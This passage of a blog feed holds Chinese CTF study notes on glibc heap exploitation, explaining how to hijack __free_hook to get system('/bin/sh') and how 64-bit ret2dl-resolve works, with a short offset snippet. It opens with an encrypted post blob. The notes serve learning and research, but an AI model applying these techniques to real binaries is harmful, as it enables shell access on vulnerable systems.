d427ca3a3ce6233305f07054d73bd2570e93107a9f750ebaabd4ee6fc4549d9947786c1fcb9f488c3e05ce383a7e8c6843f834c74346ba8fb9cc0ebd3150f5f5ebdab27d5d9a74da57fed1ad28e6ab38cc2614a3b77682b8db4e9abbad5c1cdf7c8fc81500113863718b926433278f46e7567c527d11ccfe9940e3dbda4960ef4cdf5864a792a97936b6857537ee819dc4a70ef61b07ad3c361c58891f6374d36cf3331b1405125ada5b0be559c1d316043d9757ed8ae5eb3ab73cbbdf0108707f835607ae0be79fb626289ff990c802a904a3c4b695c5c1adf7d2351ecee5286f08c144f46e8c149737416afe520bc27b0d59ff32e41c863885c153af6860792eac23da57fe8bcbc293b77405d7bda2ec23cbcfbb765e90b974a7a489b9a38c5ff74998f1f21dd329d35e67852f74f6b83ecfc14284423c32547634e0cad0082ba00e6d6bbb22700ce1a6618b6359e455a220e22b4833b1a18bd88432b38581e189fe7a0ba5cc14f35bd2b5060a4b0a0b716d4e278efc060f474b6a4062fd3c3737e87b3d81a26c1d42543d441e7709a0d131b6de90644ee86d81d06d3e5cce7944d47d3a72aaa96d470d02a6063e18882222b57cee7f5f6164623a32ccb8919482dcef9340473c4d06b5f5edef24c64c3690f1b23e349d2b01aaf4335eb1f243f8a948616f0c53c966178720c97bc24d0580914ff7a4b4543c4faf3034b273563de9de8d778f5fd51f0065d6877b0ef5f0144fd3b3d5efc266a11f8d3c0102ba62f419668dcd226603adc48c3d6d385ac8e4944ff83d00674ddc5084b843253d6bbe541f6e2a4bf08f49162af665633c44ff98d11edb54978489d58859e1a3d6b2dbf0cebf75b8679438fa7aaa067d386d42bcb99a6e2790a3d7c442f3a9fc5816f5f1e3cf3498cc669fede3f6451c906507764e012a49cd152efd9cef974d9bcb4bba0f9876c89925d354819179922782e024c39f73cdb386626204e3e19aa307312767d3b7d03ebd8c76ede612eab025fa495fbdf0b92c8182ad084c8d0d6c8a9ce45ec0d0d0d8e478932601de55d3ff53c8cf08352804bd01abf955f9582d32e1cd0b2c7d5417477e308134ac65b7c967d4f32695c21a9d93470850cb8c7de25148a7345a7c6147a4c7e6c8e1b182cf53a1608b90bdf747df1658695cb777f3aeb7b7f2e4703d8fab90bc6417824e267a61c60a83dbce0bf52bf5f7abfcf6bd10a85160919b65e32a891b234f1bac95938ceedd5ea16ba0f1082804f99e6f80140d209797b373102eb99ccfba8155b2ed40e7de9fc7af9a9fd5b5e439a99e9a259273d5fbb1404916c3af1f5efa4b51244adba62d6aca5428113ed395c6b771e49f57805495313da75739c304e2769eb3c8c47f45ef22c5434f82a02faf5564b6adc1948fa02d033f19c474f461d14105ee9f1cccadde9171b11b180863be3fd26285f250d6926e7d60f985bc159637208ae929faafd2da1df3148f8414bdd41f3029d98c9ea6c513c2416d2c18cfe33c4fcaf95b15ffaf4169243e666fd2389c4c288a553628d0a709291726b784654a48149e2d33680da207aa5b91111638bbe73cc46897039068371eb18b71c1cf7b9035ebe70607acf065244d60148e770d8ba21f4188d77455875e335c9ec5e72884f8d7ab00ea4bad854bfdf0340a5e3f5a5ba9c01cd2a0f73685b64caff5e6775b1dae94054f4e6c907a91cef4135d668d206b73e888c767f23c623ed904b594a9400a8c819295d415c08d77a2a356d34778c559ed2206f8f459babdbfe95e2c775bc0120690c0f6a7d79e90c71caf7b8454d87563dee9968aea9ceecadf8fcf1848040ed67f2235a28901053e624a61fe5fe20a3b3039c90919002d0f90a1ce5a43af8a068b8d55c23eed13a545f173d17e5f00c6645694a24d90a28c0de3827c53f5e50ef06d3044dac7ad1d81486a3e888f55a78e028832219c5482a74111ee9d9c23e27efcf26cf8d30bc0fca34d79d2bec74b0c7628e3157c071f88a830e3a51f350e1d57ffa28b32d32dbcb1674292a1d52b5866950b5298ee60aeb79041c3caf3520e78416be26528e510a19bc4b8aebe97760df9f4c99286770082d375eeffdaa77dd47767a1abb558523adcf019eb973072c0da921927c1cc19e34e1231d9c262309441fcf22a878840c8de449f75d8b39c6b586fe1b165145b81f37a4803ae413682d493a3e8a8f17f8a8933068a6588d82e0c2cf0d3e405cf96998e4e31ea94b66bab2b91bf68493247ce48748c0a81478c6edd6ae1488669ae29367bdd3e33bb789efc41d9735db611f2913b6f1d8616eeabe61968dcdf26ebeeac1d99804a9ec6460f8641c9411705f88ee21ea2d027a3817b7734a630bdc71bec5b1d905ad85b72e668db3af66180aee6f6d6ca23cab2ac3524352fac379d4b24c67376edc15fa7c479359bb22b3180be65f2a1a333ce02eb2f2c447c4acc0888d993163c29cc24e68266a0527af22ddb622d8916318713abb79c6cb1ba27eee9965269bf96a9ccddd7e01a0b166e4c874859202b54d8b5e6161554e84310b037093701980eea6bf110445e084f73c98789e5e006a9c0c84d9903a4893e43169462cfa27f67dfe861dbc1ac04c96a45defac0864459e73ccf5a920d04621f7262e766340633acd9247232dffd2f648f3c764f35932049863784fccfa2d84c34050430bf197241fac6b30b9afcad82de061ce799cb32a26d0ebd2ef17f4e557da797777c9659c2b03a9ce99699d887a879551990ad48b0dab4607e75e71c4f3800e9a087dc312457e9433d1a9f62dcc7a8616c8f17998428e353c8732456b7d510ae32fb1fae271a9d9478c6d96cb93d79977b9aff5c571720aff35e81d796ba7b27a7fa5f7263f536a99127e6f15b292f7e4883c3f8e1d60d2927103dbfb3344b19b8075b5fd2836c95c8ab66fcfc2e013630941bb6686b94e52594bcba27215178551a395445ec835e46d7beb82577e592ab88cb39ad58e73e17ad1ca0be45dea84b68bd7129377e82c936432192bac9d2df14e6793874d5361b24c58ca96f17c5445f2b7f7a8c0190e1a523670cda2e58d16a290c019c675d1fe68338f257ef3c2888f03e8cfbbbf18c9472540d2fd28b9deac60cc09be1ee16367f471a693a2b6a69a7fd0199972a43a36eecf0c53184bf6d8a40fe8941a5b123ad30eb45c4eb43e0e3d54c9fd341371115fa71063ff8039e88a984e0dd666b478360a1aa31fae7e9f105736eb3cc98c265b53f0301f6b93ef770465ac336efe0075aa9e8e2e597674631b50db9a0c73538a8cbd747408bfd6efb8d87c6685f36ea2fe7176d4ebef5b34ea2617d15245693d37b818357b4dc2b427f425e23fbc1c7d276f926bcee1cc22b94d0753c67c00faef83c4e5b9baa16c9eeda0c70fb74dcb82f8cea407bb4d2bdcf28570409deca597a1821fea7136f4b4510a586b01ac98abcf28d0111b6487aaeb0e89830c81c1886643933885381d5cf30ab6671e5e73bb470d05c0bc595576728d63c11ae143a4d7419642427563ad24c9e69408cd325b3f5ecf60e86f234c4a997a288d9702ef57139b0a469a901f7ebf49445619ddf23445f286f33a2c119c044c82dbaf951998833b3b3ef70af74cebde74677c3c9d8b39994190b42239c3e42a35e3714623fec42e7eafa2ea88408e27e24bda18fdb28515ada29ab2fc0452fb2d567d21771ed35a1d7f53fe6af547419f93d5c3d51753bafcab627e4f22d73a50c0b7bddc7805b0e8a6b77a5dad8513f5a5a2a4d466b21eb971b8f285914e21399ea42d127316f9912c62a11f6dcd5d85e037b654c0c28964cdf46c3148f077dc4dc460c565d72ff81393bb67f248abe03738cc00c29585f7e186ae64c947c3be83bb91084423070e6325d8e873075c141fb62b0fc7c6f09092bffaef2dc041e6c99b2d12f6ca11dc6af16edd418e42309a931b08c17ee9513bb06efaacccbd8b0133dcd4b9334d23c617c378dd10db230d7504c2fcae42e65839a0003ffbadd0d183006db284a6f81dc57ba39f21b6621132673618633839aa4acfdfdc5b65ee231d83a8d6a295c7dc639381c5c58418028e03fb06dda4c554cdf63450fe87735a1b1f1276198c8b8950ba82d5b47b0dd9079ea9b0a8c8892f5ecc7240246501be04608036b112a19b6ae8c56acb5cb9818ffde6a89e73841edbd6a5c5f21a268cfc649a9811ddbc5b2e0b82371f5552f653af36b43a130f8f803f329e97e2ab73a76f30e186481135779d2a2dfa1e1023726f34a9cbead2a535cf1ed483d5e0894292b94ae02a0ba9317c856dfa88bc7cc1b90a6eac889be2ceacf42a3ed8a96e5eec420028aba8b6e9253264ca0c66d79c854b381be60df15a4f0b3038bdd5fb01f5d8493eb8b371221ea5e78168ec4e86e92797286badce2ceec2873507c258e82528d8c01b60320bcd0b40da5c8bd71310ee7a651935adac32487e0d4a718296f61b9a0f1280bd10799924eb1da6c3a2fad8f4c6d40466253f9758480c457cac187f6781856b1cd6c008a20263fbda770ea2904ede5a3ea388beb10179a26a97eab82c8c91bedb4d22c9c358fd1a3986cf9f0f3d30ede12770f750be435d0671bd78caa7d595bad610c32f94a2a80d8c106d5b9a028a92855fb5130447bf7df3d8bfc7a9143664f5b26f3f407c9274adddf7d14467bbeaa4eb660dfb42ae71ce3ea31d5a8e5cc746fc1fe5b1816eb36bd39167cc5616a5620ae22d37ce0d8bbc40eb53a5bfc82b579fd26237e87b67b07d35b9f387f8f4444dc738c16310142c4f02ce6ff281f20e018cd92061dc824dc24b94945ae22e372788027c3873c50ff0c22cfab28c695a49a509ee43e2bebe92d68bc6b5fc22177d9fd56716886b5c847803a606b91000fc8b161c0172564d8d8c372a661fa4a14d05db45738874881af42bebcffcc7b4fae77ad01092b85ed9a6042a0cc6666fa160d9cf8b08617ff2a0d379d1766a4938b045c3eb270ab6634ad3433c651749687a73c6029a5eff5cf5ab3563617e075cb3be4536f0999cbd545d22e842dbc3034bfa246fbca3557271c2eb40f2a7f3a7bba28ccf9f6cbad5951c7aac4ca950859cb92f2058dfa8017c7078fb3d8e1242fd4fd9c3641d0990890b55279e7b39dac356050ca85b4d838594d46e5f82486d8b67a40d0a51aacbfa320e036758e88dd0bca197671d3a1dafbb02d11786062626e5bce2de3f758b8b13792784e1407c3c6b31a4b1fa938bddb435c701f140d4787433114a2e5e806d3962a550c1f2352108f57e80efe24b0641831f5c9b0833896cdbe9015a2c3e5f4c06a9c6427c8858ff41d4079d5a8e48bd80ad6fe760336f2b83f616c93f1f5c4a987526793ae2dccf00c93f9f221c10f0f71241908bbf1980d5e75760722272a844b510fd118bf2f810739c3d33b96a932a651ea737f1b3cb8241e33540a67b0bdda3bd47806617ade7fa5ccdcf77028099dfb0211c5df9befba10cc2395506ff418ae074517bd60f257cafbede7c5683fa5f3b8d4828cb30642eeb41b541d0b62f96ab3dd014d636f49fa75dd6a820c255c66677b852248a07f412a6a00c1de5b74d1ff53afcf61a40007e90789a7b20738622bf2abeb5462b543059b2b88838c0cc28f11becc332a0c642e7f6a8f3121574e3e9357cba3dac9e69c8fb88af21eb29b455854875b4916adb6526385aa176500445bc07cfff9b1c450ddb8eeab54daf36bd0380d6b0f19bcdf16a9acffb86da3b6958709333141355dbcc0a9f53f9f28e49cdad5ad04991c0fabede15d9c73845f7e2dd6242531b7bf3510097a9fa16b52cf300e6891d556aa293ee6723a986b17fdb89cd55192c040f9cb1d072e84a722947afc1dd47de1a1d53fe16b1cccf57dc9066f55900b9eebc0751c2477147c9cce5d0a01a453b592e29a0704ae41e5b99cd7f27880327a49c4ffb5cd36ae6f5f1bb10fd7cac60d4171c595f904d868da036e9399cd78c7fb5458d30c3ca4a9793c633329fe2d71a3240f2290c421686173944046f17fc9d740b96946bc4bd47894238705a017d3d7c9271f8b49659f08dc7165bf5aee656008ab79b4f1a52e29ff31061c86f953afa5c8fa2a9ccf8dfba3869a31f52c8825e7e9487eff4c4a03b5ffc079d69b08709f418aef6d2104c8fc8e9a134ec80c11793563b97b832e40c00e3bf5c5ba3f2d5ddd4e5d618abab2d93abac72363a4e11a985a6694adfd1088e5e4a6cd223fa66eaf9ef47fc80f2c584cee67128b88bb4ee75427e17cb273d6ce8e4765d416f37d6a4f587a09d3c51429e04b62c4da461c5972cc284e4c4d9d633626a084f072fba81ce2108334cc147617ec19a7cc8c272ab57730171edb8f7762707f2efd5b0ac617907c2d037c3c293ccd306b484de0cd8764ba41ab9d83f952d30c7fe94925231e47a713b347e3f717261c7f0cc21e887d5a6c43103ff6958c495e3edf84693914311465ee56bf63da2174bd88c44e17f426ec8c491b75b3496e00385364dc74c00e9c5470d6e554aa6321e0b556b6d6c38d6b98242053d73d87dd196fa26878362cfdae2b9a34bc7818aee775d0bc8bc4ab712acb33ac24d2bfda44272588c272f2660bc0336cfbf97b0a76acabeeef791bb5aa0fad4c912f095a9a04c8feb1da3f299d8e71fbff6bd497bb1900ff8b5ec075aed728a3571ee6a674f654e815f7344c71a6a00ab35b9cf95f0ce31e695d6d5ffe1aaddc0678d7a1118b763352bb91bc1123380b830fd612d540bada7b2562d9575f06e4e58f6ee285ace4f15f2f004a98a988c62e0d84697e77868d2bb8751583c0f9b876f86f8bf93d08e50875d636c7b559c2f38e3f468f321c62f508fe839ceace7353f7ad147552033496f0ede819a3bf1222de001325bd7db4e7b94dd2b339ee71af1c0541d629ccc7a383d1a043c8748f5164b60eeb5c1042732f84d8d7123474487d851030df42f3bb5ff387d9b533f82bf81fdff982a48479854f39574716e41401a2c63d53b414414225f485edccf24bec1f3f8d19b739679e512fa910a13bbc18164614800674241e401ad67d88c96da1a8cdf561a00adda3eb0a0b826625a86e4d496d38cfc5bfd829e58e8c848fff60e00c3d966fd0fb51a2315fc411937ed39fd4777cd14e389107ede665aa2fce6747d5e917a752999f2f008b8aa1031ede5cd18fb1f844128d7b74e23cc353aeb47c798c729d96e76d3108e153b7279772e75a04156ab3ce29c2edd3466c63af92ee98815ad95d5b54c176d2adfdc44c84ddd374f7f23312cc5e8dce67fa3a0d519e6228f945b5659ae7a9ff309c1098fa6909b99e2a76692060000b5c140ad2892145cbc09fe1bd1c403bfc1e51339c81c883469cbe0c414eaad9098930c13cd491a81da3f8fdf9ff2f07ba75d7707051ac818f01628cd1414d407f15c0f2ae0a6ad8e83dc8a8c0cc303a7ccef6eb1d88f8f88d842b89e6b87bb9a701e4ad68880354bddf030697f1344b66d140655e24f5d0782b9666af5355c7d6e0a419673282d08c81109d9cdef087eb68fc3d25c848065b6589293dc3fa172df872406dc766cb75a957c8d2151f33b7771b83e8d4b8477540cfa3bfe04067e5527ee8bb29eff2c384d5507f54b2062106381af5e8065c8adab9bb8887e74212aa2b27e6a1efab61654c466f96aad76b4752e147c8bc6d9ab4ce2a2ec6a0d8e13c2fe8b53a5688c5b3d7544e3c444d8c76db7984c1b7e3faa21f1c24d09ded3074dcf118cf344f7f9704fe62e0f583008309895ae8da694fbb5dcb6d5416639d186ed17f1304edebfe9c7c482dccc85a10445dd5557e4f6343adc0ed56e6c01ab28affc496805decb8770845b65d4bbe69ce3571d86bd657e6529bd08c0c79d227e35a494fbe4845faf59e2ea6d3c9310e136ef19dec103af3012b6d04bfb1a98d007a4e773652d01ad0b7f7b5ec65268b3db526ced3696d15794b4c0322fa06f5dd7e43d217c556e2d9ab6afd279f22fcb54042ea99d2776ca64ec88630b7559bb1558f251118c3169081cd91833da98637942525148ba623096ba9f258396695f24af8aa3f423b01f9793c5263d91eedbe1ca887047e1b414616a0c0f80e23651320fd35b5ad1f9ac057786e0ad61c5cef85fad444496494ce558c28fbe784561932e304f800ffa1d593395878f9eb1412127a74e5e1871c54b46307fc3a8eb51d1f166ce1da98f59d6287476efcdccb9d8da98f813cb8794fb82df5d94e6af5c9fa42e1afe3fbc80a8cdfad526175a2b6dd59dfee73d67a615fc43944fec8210ae3ecce74a782f96b162cf627adfb5a2bc6230cfd85d6b6090816996380952248992072e03ae201c7b4cbab054f64b9ed6b44ba601d44a0e6abf2bc99801f095263d315da9499025e1ff4fd21d877c71ce6f7131a392f950faf8a997b7f79b57553b9c8079396c2eb010b5c4eaf6bd7b4fbac67e8393719fca00a5719f7f83d94af8d715b6ee4daaa96d2aefb455faaee5f8753ee9886af0938501ed0a39731aefb03cdc2a2fa71a0d5b7b31dce09fe637d41285207e9632bbac583e8745cc69caedd53165ff190f6da79963892921bfaa4fa0456a07ce47db568c944b617f6b82857e87524051072b73bdb9a72773b134a4ce1008e9f0543e8ff63739a5dd809f97121d80c44caa1f536bc3ed123c6ae60b22d29f653d29d2ba8b708ae1a0a0dec03964a120324053217c790b1d05598a528e937c705df5eba7d139b601dbf92c0b930712991fe05db6145efc3964d4ba11fc8da08b33a029f5ca2d2a623451ca34e9bd70946b893042bafce9e3fd9b6f3e09b3a0c5f99727bdadd44cc5b5ac6266070659f8d9afa55146fe83e0e19da96964db422ae35a39fe942189ae7575582334dbf08abaef108f71e4742156db92a32508442ac633e691f64989647c01704731a3194012c114857c76f86a5cc9a47b62e031a8f2e6863b74b1fa1511263b2fb13ba9dc3d71ac03a42ab727183399d7d6b7042a425a4f0cf1e6c805fe0c1c9d5d4ea894861fbf4eedf2fdf953391e90d6b326fc6e11566a5dac999b49611833a947bd4c5ae48ba6987744b7381fda6709cb57b496757c4bb50ffd423421386032c074de4fc90ed6f0f00b58aed396b3235da0b836efc5b02ce787e8b4d084c269784bd5162fcefe10e8d0176d0b5bd347ef2b2db21112986762d1c91792e49e0d2a2262fb1cde2c05dded8f1a041dd591656c74fba38099f78988ae0e0a38624484aa31c37b03179e8ddae9a92e901272dca946aaee982fad753e2e59299db95405f6911c3d2da369e43f747896f1a5d7a58603fcd4197fd5422ee382904073a597cd59cbef6cf55e631ae50805891e97c67891c16422ccc365c70892d123475a36e604292f34f30a22d852a72ba583d3e26fc6264e77cf13d11ad313792096fc8699438e924c3e645bba111d3d8cb4c8c99df1640f4683ad32772e9bd081f4bf28cf9f3430a1304a8f28152131d7aa902b2811c19f6037de1e869e31ba383cfb09c9f0d727a11645ee5f414f9abb56554630b86231ef9278d60d93fc8fc0b40ebfbca4b7b01e722f7f5d1f71ac1c5bd94b0c421db1f7a84dc3daa5d0fb7800fa433dd5aabe128d3a95a30c0b4aa456abeb4e1623c78ec87b3e69a19be28434e1665a0a60611963904f13570523644b1db8716ced5fa19e1ef348c1cf96eb48b1f054a5455ba231a9255bd85c12788bc3b6a09d3fe1301fb37c82823c52c9f5b3594115c3c526a574f72c18bf6389fbaf88422a4555af3549f8f3a22a81697210307f1b7fb2b3d94b464f06dc3b106105bb92cf7ec4a8ade641db18fca0244556c8e6c47420111a181ac3fb24579b86ad4c6dc4cf5c55cbe9dbdadcb8e5c06ec748c8b8cd0a9a3a24faf31d795588a88b896a325754f061d3b4cde0daef6ad337664e73955028743c20f1c692cb7a3bcfaa2edc46fd4fdb4bc005040adafa67364bd6cdc2557e67833a4a47089566bea328026efad9737431a31fe197262b18ae1701d8a7f620c3ad475135a2cd20a24b1522e32c9e73b760b7a4efbae0a83b22304baf409e6c332a91e8f9e3b04bef32de997386b58c29ecc80e308ed1db9f7e6c6932849a19b0852821dbfaed66ca7c369447344ce30c0783668528abc6ebaf61a76a3a69bb2ef2d6b62b7b41f9dda0d8df459e341bbb0b60a95f2404ed6c098916b4b64ca93591ce4280dd61bcacd3a4a1e14ca20da5ca1c5dd874bc399ce8b8e069e71a817185dc4424504e46857319f1410ab42cbef47e1f09cd08886ee0f7196c19d64ac172d7bbcad8298a705c6a68b0aea5167d58dca27ba5d9368d4cdcd5090bdfc15a12b740e3fa4741c2b7c80d26d6c16167442f868f68cff095329afa680db532a36fe706ac724b2d86b6790260fda2cad7bf514a8280577c64d0ec04948c2de89afeba3c9656c16eca13b34751fda68a1e0bccab6b7e0b0da914b37a969390b4d8bcc64f830be3ccc1aa241c6b4fe5f47b56d27487582728cef41876ce6df2cf130f4d2970c3db24c5aeb280f99373c8544cc63dbe42aa8560bb2f6963521c53ede2a73dcddca38c4c009627a64cf7ef6a4cead48ec5bb202a42b99d67eedc5a0bb2124c3ecf2ef060d87d140dd4ccf05cb78560c04490325b5d09df95608503dea75e218b6816cc8ba74dce0e7c9e57208d4f2f672ee5c882b82c70f9a05f01de853b85e866210ce2c98f65ef646e29825debe004d9b1d46042aed5c08708a2f8c03c17f458af53ef5bb8f62bf125123e4fbcff1737feddecfe86ce52b145e44d260f1914a6bfd81d2a5b563be02fef6eaf363cd1c056c319b87adde6bbb8bbe93d18988aefab30b430c04b85513c754b370a9146a8ec9bf385f0518f3449c8752c3f4a1225e7a1cf932efd9d4652d7e6b636c832eee11a07eae48d817d277385631249c90b9f443b9271832ddf7b214a2ea1af0a3b1b23be3856b63b9378a6f9dfcb216f48b1ea103aab4901780b3c37fd71b02841eea45eddba03d193cae017e3d040ea8bec10dc28ed2fa1dd7c426460f21c5230881b6065ec3d9d354381aac87f4512dd4461f0a4304cd85c4ff2722dbf668a21d43ee9ea6a14136031fcc4b66e41f1563ca955b8ad045101ea21ec20c60d07b1d97d9af5df6a5adb3b960c14c2ee90116632177caaf88e2a3e3911408d96d501a48e88de6f710ab523c3cc7245ff83430038e0c52f00e045a78011420d4b2f44a6cdbc29919956b46031c2472b90e6637c35390ec4a684b93906961fcc8457d05fd7a0bffdfb1df9612b1979363bf50fde325d5d8cb67a2c7d6dcf6c65870e02f826b0aa0779adcc3985a1fb7ed90131f734b9c741a65caa33b454e4d31fa7af9bb2452d4dee17c2dc36187e9682e192268d6a702f886427b302023e8185df372a43730cac7166596899cae32bfe1c685e49098302bf318698f0a2966f52dfa554a7c79e214a0730dae3285973dfd5725cf488a46ae3559edb58e82137a477f84c41b9253909ecfed3edbb623b2c8c2602da20c87ef488c4ae339bda31ac4c98c53b9f09956a385b1f575a1b9b3f1faa7bc789c0cf15a7c324eb5985f03ca42e4a59c50e52b44ab1fd0738ae961508ea1f31c318db4456a635e48c8dc48cc455f74d5f840fbb84a9074e770aa9fe6af76d2690f66ea5f1ba2e972e20ed2fe428367e6612e63f252f864b91d0f907de39e573</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> C </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>free_hook劫持(glibc2.26之前)</title>
      <link href="/2022/11/22/free-hook-jie-chi-glibc2.26-zhi-qian/"/>
      <url>/2022/11/22/free-hook-jie-chi-glibc2.26-zhi-qian/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>做Full RELRO的堆题远程环境one_gadget总是无效,于是便来研究一下__free_hook劫持,加入tcache之后的__free_hook劫持比较容易，本文主要探讨glibc2.26之前的利用方法<br>要有其他方法(或是让one_gadget生效的方法)欢迎qq交流</p><h1 id="free-hook劫持原理"><a href="#free-hook劫持原理" class="headerlink" title="free_hook劫持原理"></a>free_hook劫持原理</h1><p>在调用free函数时，若__free_hook的值存在，便会先调用__free_hook指向的地址，于是可以将__free_hook的值改为system函数的地址，再free一个指向”/bin/sh\x00”的指针，便可达到system(“/bin/sh”)的效果</p><h1 id="free-hook劫持方法"><a href="#free-hook劫持方法" class="headerlink" title="free_hook劫持方法"></a>free_hook劫持方法</h1><p>不同于__malloc_hook和realloc_hook的劫持方法，由于free_hook上方一定区域内(<del>大概率?</del>)不存在能制造字节错位的条件(<del>有的话也超出了Fastbin的范围</del>)，于是直接通过<code>Fastbin Arbitrary Alloc</code>到__free_hook上方的方法基本失效<br>ps:补充一点,gdb.attach上去可以看到free_hook低地址处正好有个7f开头的地址，不过这个地址是__isoc99_scanf函数写上去的，函数执行完后便清零了(<del>血泪教训</del>)</p><h3 id="1-篡改top域"><a href="#1-篡改top域" class="headerlink" title="1.篡改top域"></a>1.篡改top域</h3><p>通过改写main_arena，篡改top域并将top chunk转移到__free_hook之前，便可通过分配chunk劫持__free_hook</p><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ol><li>前提是得能分配很大的chunk(分配很多次也行),因为实际上能伪造为top chunk的size域的地址离free__hook很远(glibc2.23这一偏移为0xb58)</li><li>攻击main_arena的top域也并非易事,malloc_hook-0x23(glibc2.23)处的字节错位得到的fake_chunk并不足以让你覆盖到top域(<del>有堆溢出就当我没说</del>)<br>  倒也有解决办法，虽然覆盖不了top域但可以覆盖fastbinsY数组,修改然后获得一个能覆盖到top域的chunk<br>(理论上是可行的，但实际过程遇到了很多高手情况,以后再回来复现吧…)</li></ol><h3 id="2-House-of-Corrosion"><a href="#2-House-of-Corrosion" class="headerlink" title="2.House of Corrosion"></a>2.House of Corrosion</h3><p>篡改global_max_fast为一个较大值(<code>Unsortedbin Attack</code>),然后计算__free_hook到FastbinY的偏移,再计算要伪造的bin的size</p><pre class=" language-python"><code class="language-python">fastbin_ptr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main_arena'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">8</span>idx<span class="token operator">=</span><span class="token punctuation">(</span>target_addr<span class="token operator">-</span>fastbin_ptr<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">8</span>size<span class="token operator">=</span>idx<span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x20</span></code></pre><p>size计算简化之后是这样的</p><pre class=" language-python"><code class="language-python">chunk_size <span class="token operator">=</span> <span class="token punctuation">(</span>delta <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x20</span> ，delta为目标地址与fastbinY的offset</code></pre><p>然后free掉对应size的chunk，更改其的fd指针为目标值(在这里就是system函数地址)，再将A分配回来便完成劫持<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202211221629378.png"></p><h3 id="3-制造字节错位"><a href="#3-制造字节错位" class="headerlink" title="3.制造字节错位"></a>3.制造字节错位</h3><p>不方便利用不就是因为没有字节错位吗？制造一个就好了<code>Unsortedbin Attack</code>在__free_hook上方写入unsortedbin地址(0x7f开头)，然后正常<code>Fastbin Arbitrary Alloc</code>劫持</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://aidaip.github.io/binary/2020/02/20/House-of-Corrosion.html">AiDai  House of Corrosion</a><br><a href="https://zhuanlan.zhihu.com/p/448880453">House of Corrosion 原理及利用</a><br><a href="https://ray-cp.github.io/archivers/heap_global_max_fast_exploit">堆中global_max_fast相关利用</a><br><a href="https://seanachao.github.io/2020/07/13/hook%E5%8A%AB%E6%8C%81/">malloc_hook以及free_hook劫持原理</a><br><a href="https://lexsd6.github.io/2021/03/14/%E5%8A%AB%E6%8C%81hook%E5%87%BD%E6%95%B0%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(6)/">劫持hook函数</a></p>]]></content>
      
      
      <categories>
          
          <category> 探究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2dl-resolve(2)：64位利用及Full RELRO</title>
      <link href="/2022/11/18/ret2dl-resolve-2-64-wei-li-yong-ji-full-relro/"/>
      <url>/2022/11/18/ret2dl-resolve-2-64-wei-li-yong-ji-full-relro/</url>
      
        <content type="html"><![CDATA[<h1 id="64位ret2dl-resolve"><a href="#64位ret2dl-resolve" class="headerlink" title="64位ret2dl-resolve"></a>64位ret2dl-resolve</h1><h2 id="32位与64位差别"><a href="#32位与64位差别" class="headerlink" title="32位与64位差别"></a>32位与64位差别</h2><ol><li>相关结构体大小不同</li><li><code>_dl_runtime_resolve(link_map_obj, reloc_arg)</code>的参数reloc_arg在32位是地址偏移reloc_offset,在64位是reloc_index，含义是所重定位符号的重定位项在重定位表“.rel.plt”中的下标。重定位项地址reloc = JMPREL + reloc_index*3*8。</li><li>在这里直接引用<a href="https://sp4n9x.github.io/">Sp4n9x</a>师傅的一段话(<del>具体为啥会有问题我暂时也没理解到</del>)</li></ol><ul><li>64位情况下，bss节一般位于0x600000之后，重定位表“.rela.plt一般在0x400000左右，所以我们构造的r_info的高位(sym_index)和reloc_arg一般会很大。又因为计算符号项地址&amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)]和符号版本项地址vernum[ELFW(R_SYM) (reloc-&gt;r_info)]时，数组的数据类型的大小不同(symtab中的结构体大小为0x18字节，vernum的数据类型为uint16_t，大小为0x2字节)，这就导致vernum[ELFW(R_SYM) (reloc-&gt;r_info)]大概率会访问到0x400000到0x600000之间的不可读区域(64位下，这个区间一般不可读)，使得程序报错。</li></ul><pre class=" language-c"><code class="language-c">      <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-></span>l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> <span class="token operator">*</span>vernum <span class="token operator">=</span>        <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> ndx <span class="token operator">=</span> vernum<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span> <span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fff</span><span class="token punctuation">;</span>      version <span class="token operator">=</span> <span class="token 